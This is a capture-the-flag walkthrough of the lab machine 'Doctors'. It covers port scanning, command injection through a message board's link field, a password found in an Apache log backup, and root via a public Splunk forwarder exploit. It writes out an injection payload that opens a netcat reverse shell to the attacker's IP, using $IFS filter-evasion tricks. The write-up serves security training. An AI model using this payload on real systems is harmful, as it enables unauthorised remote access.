## Nmap

As always we start by scanning for open ports using nmap.
![nmap](https://user-images.githubusercontent.com/16364370/102866199-c937e500-442e-11eb-942d-de51c4b99faa.png)
3 ports are available _22(ssh)_, _80(http)_, _8089(ssl/https)_.

#### 80 http

Once I visit the ip on my browser I get a webpage.

![webpage](https://user-images.githubusercontent.com/16364370/102866215-cc32d580-442e-11eb-8529-461037e71fde.png)

The only information I get from this is a hostname `doctors.htb` from the *send us a message* section. I enter this on my hosts file.

![Login_page_doctors](https://user-images.githubusercontent.com/16364370/102866198-c89f4e80-442e-11eb-8b94-12c50aab8cf4.png)

I have a login page, but also I have the functionality to register. After registering:

![account_created_time_limit](https://user-images.githubusercontent.com/16364370/102866188-c6d58b00-442e-11eb-9a13-f82765935e9b.png)

My app does log me in automatically. Also there is a message which let's me know that a time limit of twenty minutes for my account is in place. Using the `New Message` button we can send a message to something which looks like a board.

![send_message](https://user-images.githubusercontent.com/16364370/102866208-cb01a880-442e-11eb-8f76-89c0490f1ce0.png)

After providing a url as the `Content` to an url which is mine.

![gotrequestback](https://user-images.githubusercontent.com/16364370/102866193-c806b800-442e-11eb-8896-8176bd541271.png)

And I got a request back, which means we have something like a command injection. Let's try to execute a wget command by using `$(wget http://10.10.14.14)`
But I get `link posted is not valid`.
![link_not_valid](https://user-images.githubusercontent.com/16364370/102866196-c89f4e80-442e-11eb-8e98-46abf8ff3232.png)
Let's try to execute a command using `http://IP/$(id)` so we get back the result of id as the requested file.

![requested_back_id](https://user-images.githubusercontent.com/16364370/102866206-ca691200-442e-11eb-8855-d117a3aaa1e1.png)

Now I can execute commands inside `$()`. Let's execute a reverse shell.

![errorreverseshell](https://user-images.githubusercontent.com/16364370/102866191-c76e2180-442e-11eb-87e0-a0becbf83712.png)

Nothing happend. I will try to add $IFS instead of spaces, but again it didn't work, I had to find the nc binary inside the machine and then use single quote to get it work. This is the complete command: `http://10.10.14.14/$(/usr/bin/nc.traditional$IFS-e$IFS/bin/sh$IFS'10.10.14.14'$IFS'7979')`

![shell](https://user-images.githubusercontent.com/16364370/102866210-cb01a880-442e-11eb-957f-82acce607d89.png)

## User
After the shell I try to look for passwords to escalate to another user, but after a little bit I found inside /var/log/apache2/ there is a backup file. I find a password inside of it.

![password_found](https://user-images.githubusercontent.com/16364370/102866201-c9d07b80-442e-11eb-85c6-726d02fd4acb.png)

I use it with shaun which gives me user.txt.

## Root

Inside /opt/ folder I find `splunkforwarder`. Searching for this I find that this forwarder is used to collect data and then forward it to the splunk software, which seems to be something like a visualization software. Reading `README-splunk.txt` I get the version but didn't manage to find an exploit for the exact version.I also find github repo `https://github.com/cnotin/SplunkWhisperer2` which has a script to exploit this. I get the [local](https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_local.py) exploit and upload it to the target machine. I get an error about not found modules, and I can't installed them using pip. I try the [remote](https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_local.py) exploit on my local machine.
I create a file inside /tmp/ which includes a reverse shell and then execute the script. Also I listen on the specified port.

And I get root access.
